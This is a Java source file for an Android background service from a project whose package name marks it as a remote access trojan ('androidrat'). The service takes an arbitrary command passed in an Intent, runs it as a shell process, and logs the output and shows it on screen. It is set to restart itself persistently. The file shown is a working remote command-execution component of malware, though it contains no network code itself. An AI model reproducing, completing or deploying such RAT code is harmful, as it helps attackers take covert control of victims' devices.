package com.ot.androidrat;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class bin_shService extends Service {

    private String command;

    public bin_shService() {
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        command = intent.getStringExtra("command");
        Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() {
            @Override
            public void run() {
                try{
                    Process su = Runtime.getRuntime().exec(command);
                    StringBuilder output = new StringBuilder();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(su.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null){
                        output.append(line + "\n");
                    }
                    Log.d("Shell Result", output.toString());
                    Toast.makeText(bin_shService.this, output, Toast.LENGTH_LONG).show();
                }catch (IOException ioException){
                    Log.d("Shell Error", "Something went wrong");
                }
            }
        });

        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}